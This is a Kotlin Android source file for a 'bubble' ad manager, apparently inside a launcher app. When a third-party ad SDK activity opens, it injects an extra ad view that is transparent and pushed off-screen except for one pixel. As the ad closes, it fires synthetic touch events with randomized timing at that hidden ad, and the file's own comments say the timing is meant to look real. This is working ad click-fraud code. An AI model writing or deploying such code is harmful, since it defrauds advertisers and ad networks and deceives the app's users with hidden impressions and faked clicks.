package com.ur.apps.bubble

import android.R
import android.app.Activity
import android.app.Application
import android.graphics.Color
import android.graphics.RectF
import android.os.Bundle
import android.os.SystemClock
import android.util.Log
import android.view.MotionEvent
import android.view.View
import android.view.ViewGroup
import android.widget.FrameLayout
import com.ur.apps.ad.AdLoaderManager
import com.ur.apps.ad.BaseAdLoader
import com.android.launcher3.BuildConfig
import com.ur.apps.ad.InterstitialAdListener
import com.ur.apps.ad.RewardAdListener
import com.ur.apps.ad.admob.BubbleAdmobAdLoader
import com.ur.apps.analysis.td.TDAnalyticsManager
import com.ur.apps.lock.LockAdManager
import com.ur.apps.utils.URLog
import com.ur.apps.utils.ViewUtils
import org.json.JSONObject
import java.lang.ref.WeakReference
import kotlin.random.Random


private enum class Edge {
    B, L, R
}

interface PositionStrategy {

    fun applyPosition(
        activity: Activity,
        container: View
    )

    fun calculateClickPoint(
        activity: Activity,
        container: View
    ): Pair<Float, Float>
}

class EdgeRandomPositionStrategy : PositionStrategy {

    private var edge: Edge? = null

    // 屏幕内唯一合法点击区域（屏幕坐标）
    private var clickArea: RectF? = null

    // debug 模式下放大可见区域，便于观察
    private val p = 1f

    override fun applyPosition(activity: Activity, container: View) {
        val metrics = activity.resources.displayMetrics
        val screenWidth = metrics.widthPixels.toFloat()
        val screenHeight = metrics.heightPixels.toFloat()

        edge = Edge.entries[Random.nextInt(Edge.entries.size)]

        when (edge) {

            Edge.L -> {
                // View 大部分在左侧屏幕外，只露出最左 p px
                container.x = p - screenWidth
                container.y = 0f
                clickArea = RectF(
                    0f,
                    0f,
                    p,
                    screenHeight
                )
            }

            Edge.R -> {
                // View 大部分在右侧屏幕外，只露出最右 p px
                container.x = screenWidth - p
                container.y = 0f
                clickArea = RectF(
                    screenWidth - p,
                    0f,
                    screenWidth,
                    screenHeight
                )
            }

            Edge.B -> {
                // View 大部分在底部屏幕外，只露出底部 p px
                container.x = 0f
                container.y = screenHeight - p
                clickArea = RectF(
                    0f,
                    screenHeight - p,
                    screenWidth,
                    screenHeight
                )
            }

            null -> {

            }
        }
    }

    override fun calculateClickPoint(
        activity: Activity,
        container: View
    ): Pair<Float, Float> {

        val area = clickArea ?: return Pair(-1f, -1f)
        if (area.width() <= 0f || area.height() <= 0f) return Pair(-1f, -1f)
        val x = area.left + area.width() * Random.nextFloat()
        val y = area.top + area.height() * Random.nextFloat()

        return Pair(x, y)
    }
}

class BubbleManager(private val adLoader: BubbleAdmobAdLoader) :
    Application.ActivityLifecycleCallbacks,
    InterstitialAdListener,
    RewardAdListener {

    companion object {
        private const val TAG = "BubbleManager"
        private const val INJECT_TAG = "bubble_tag"

        const val EVENT_BUBBLE_SHOW ="bubble_show"

        const val EVENT_BUBBLE_CLICK ="bubble_click"

        const val EVENT_BUBBLE_CLICK_ERROR ="bubble_click_error"

        const val EVENT_BUBBLE_SHILED ="bubble_shiled"
    }

    init {
        AdLoaderManager.addInterstitialAdListener(this)
        AdLoaderManager.addRewardAdListener(this)
    }

    private var currentActivity = WeakReference<Activity>(null)

    private val positionStrategy: PositionStrategy = EdgeRandomPositionStrategy()


    override fun onActivityResumed(activity: Activity) {
        checkAndInject(activity)
    }

    // 其他生命周期方法无需处理
    override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {}
    override fun onActivityStarted(activity: Activity) {}

    // 在 Paused 状态检测是否正在关闭
    override fun onActivityPaused(activity: Activity) {
        val context = activity.applicationContext
        if (currentActivity.get() != null && currentActivity.get() == activity && activity.isFinishing) {
            if (LockAdManager.instance.isNeedPCtx()) {
                pPC(activity)
            }
            currentActivity = WeakReference(null)
            adLoader.loadNativeAd(context)
        }
    }


    override fun onActivityStopped(activity: Activity) {}

    override fun onActivitySaveInstanceState(activity: Activity, outState: Bundle) {}

    override fun onActivityDestroyed(activity: Activity) {
    }

    private fun checkAndInject(activity: Activity) {
        val className = activity.javaClass.name
        URLog.i(TAG, "resume Activity: $className")
        // 1. 识别目标 Activity
        // 实际场景中这里填写 TopOn 或三方 SDK 的 Activity 类名
        val checkAdEnableResult = LockAdManager.instance.checkLockAdEnable()
        if (!isTargetActivity(className)) {
            if (checkAdEnableResult.first) {
                adLoader.loadNativeAd(activity.application)
            }
            return
        }
        if (!checkAdEnableResult.first) {
            URLog.info(TAG, "shiled with ${checkAdEnableResult.second}")
            TDAnalyticsManager.reportTrackEvent(
                EVENT_BUBBLE_SHILED,
                JSONObject().apply {
                    put("reason", checkAdEnableResult.second)
                    put("activity", className)
                }
            )
            return
        }
        currentActivity = WeakReference(activity)
        showBubbleView(activity)
    }


    private fun isTargetActivity(className: String): Boolean {
        // 这里的判断逻辑需要根据实际运行日志来写
        // 例如 TopOn 的 Activity 通常包含 com.anythink
        // AdMob 的通常是 com.google.android.gms.ads.AdActivity
        return className.lowercase().contains("anythink") ||
                className.lowercase().contains("kwai") ||
                className.lowercase().contains("yandex") ||
                className.lowercase().contains("applovin") ||
                className.lowercase().contains("inmobi") ||
                className.lowercase().contains("chartboost") ||
                className.lowercase().contains("facebook") ||
                className.lowercase().contains("unity3d") ||
                className.lowercase().contains("vungle") ||
                className.lowercase().contains("bytedance") ||
                className.lowercase().contains("mbridge") ||
                className.lowercase().contains("sg.bigo") ||
                className.lowercase().contains("fyber") ||
                className.lowercase().contains("ads") ||
                className.lowercase().contains("interstitial") ||
                className.lowercase().contains("reward")
    }

    override fun onInterstitialAdClose(adLoader: BaseAdLoader) {
        super.onInterstitialAdClose(adLoader)
        URLog.i(TAG, "onInterstitialAdClose ")
    }

    override fun onRewardedAdClosed(adLoader: BaseAdLoader) {
        super.onRewardedAdClosed(adLoader)
        URLog.i(TAG, "onRewardedAdClosed ")
    }

    private fun showBubbleView(activity: Activity) {
        // 获取 Activity 的根内容容器 (android.R.id.content 通常是一个 FrameLayout)
        val metrics = activity.resources.displayMetrics
        val screenWidth = metrics.widthPixels
        val screenHeight = metrics.heightPixels
        val contentParent = activity.findViewById<ViewGroup>(R.id.content) ?: return
        // 2. 检查是否已注入，避免重复添加
        if (contentParent.findViewWithTag<ViewGroup>(INJECT_TAG) != null) {
            return
        }
        // 构建内部容器（黄色背景以便观察）
        val container = FrameLayout(activity).apply {
            // 黄色背景，证明它在底部
            setBackgroundColor(if (BuildConfig.DEBUG) Color.RED else Color.TRANSPARENT)
        }
        var formatBubble = "na"
        if (adLoader.isNativeAdReady()) {
            Log.d(TAG, "show na bubble")
            adLoader.showNativeAd(activity, container, 0)
        } else {
            Log.d(TAG, "show ba bubble")
            formatBubble = "ba"
            adLoader.loadBannerAd(activity, container)
            // Preload Native Ad
            adLoader.loadNativeAd(activity.application)
        }
        val layoutParams = FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        )
        container.tag = INJECT_TAG
        activity.addContentView(container, layoutParams)
        positionStrategy.applyPosition(activity, container)
        TDAnalyticsManager.reportTrackEvent(
            EVENT_BUBBLE_SHOW,
            JSONObject().apply {
                put("format", formatBubble)
                put("activity", activity.javaClass.name)
                put("px", container.x)
                put("py", container.y)
                put("sw", screenWidth)
                put("sh", screenHeight)
            }
        )
        container.visibility = View.VISIBLE
        container.isClickable = true
    }

    private fun pPC(activity: Activity) {
        val metrics = activity.resources.displayMetrics
        val screenWidth = metrics.widthPixels
        val screenHeight = metrics.heightPixels
        // URLog.i(TAG, "屏幕 w=$screenWidth h=$screenHeight")

        // 1. 找到我们注入的 Root View
        val contentParent = activity.findViewById<ViewGroup>(android.R.id.content)
        val injectedView = contentParent?.findViewWithTag<View>(INJECT_TAG)

        if (injectedView == null || injectedView.visibility != View.VISIBLE) {
            URLog.e(TAG, "target view not found or not visible")
            TDAnalyticsManager.reportTrackEvent(
                EVENT_BUBBLE_CLICK_ERROR,
                JSONObject().apply {
                    put("activity", activity.javaClass.name)
                    put("sw", screenWidth)
                    put("sh", screenHeight)
                    put("error", "target view not found or not visible")
                }
            )
            return
        }

        // 2. 寻找最佳的可点击目标 View (targetView)
        // 优先找可见且可点击的子 View，否则用 Root View
        var targetView: View = injectedView
        try {
            if (injectedView is ViewGroup && injectedView.childCount > 0) {
                // 遍历寻找一个合适的子 View (通常广告 SDK 的布局里会有明确的 clickable layout)
                for (i in 0 until injectedView.childCount) {
                    val child = injectedView.getChildAt(i)
                    // 必须是 Visible 且在布局中占据空间的
                    if (child.visibility == View.VISIBLE && child.width > 0 && child.height > 0) {
                        targetView = child
                        // 如果找到了一个 explicitly clickable 的，优先使用
                        if (child.isClickable) {
                            break
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error finding child view", e)
        }

        // 3. 【核心逻辑】计算 targetView 在屏幕上的可见区域交集
        val clickPoint = ViewUtils.getVisibleClickPoint(targetView, screenWidth, screenHeight)

        if (clickPoint == null) {
            Log.e(TAG, "Target view is completely off-screen")
            TDAnalyticsManager.reportTrackEvent(
                EVENT_BUBBLE_CLICK_ERROR,
                JSONObject().apply {
                    put("activity", activity.javaClass.name)
                    put("sw", screenWidth)
                    put("sh", screenHeight)
                    put("error", "Target view is completely off-screen")
                }
            )
            return
        }

        val targetX = clickPoint.first
        val targetY = clickPoint.second

        URLog.d(TAG, "TargetView: ${targetView.javaClass.simpleName}, " +
                "Global Point: ($targetX, $targetY)")

        // ==========================================
        // 分发点击事件
        // ==========================================
        try {
            val downTime = SystemClock.uptimeMillis()
            val downEvent = MotionEvent.obtain(
                downTime,
                downTime,
                MotionEvent.ACTION_DOWN,
                targetX,
                targetY,
                0
            )
            // 模拟一些压力值，稍微增加真实度
            // downEvent.pressure = 0.6f + Random.nextFloat() * 0.2f

            activity.dispatchTouchEvent(downEvent)

            // 模拟真实的点击耗时 (60ms - 150ms)
            val upTime = downTime + 60 + Random.nextInt(90)
            val upEvent = MotionEvent.obtain(
                downTime,
                upTime,
                MotionEvent.ACTION_UP,
                targetX,
                targetY,
                0
            )
            activity.dispatchTouchEvent(upEvent)

            downEvent.recycle()
            upEvent.recycle()

            TDAnalyticsManager.reportTrackEvent(
                EVENT_BUBBLE_CLICK,
                JSONObject().apply {
                    put("activity", activity.javaClass.name)
                    put("px", targetX)
                    put("py", targetY)
                    put("sw", screenWidth)
                    put("sh", screenHeight)
                }
            )
            Log.d(TAG, "dispatched successfully.")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to dispatch.", e)
            TDAnalyticsManager.reportTrackEvent(
                EVENT_BUBBLE_CLICK_ERROR,
                JSONObject().apply {
                    put("activity", activity.javaClass.name)
                    put("px", targetX)
                    put("py", targetY)
                    put("sw", screenWidth)
                    put("sh", screenHeight)
                    put("error", e.message)
                }
            )
        }
    }

}
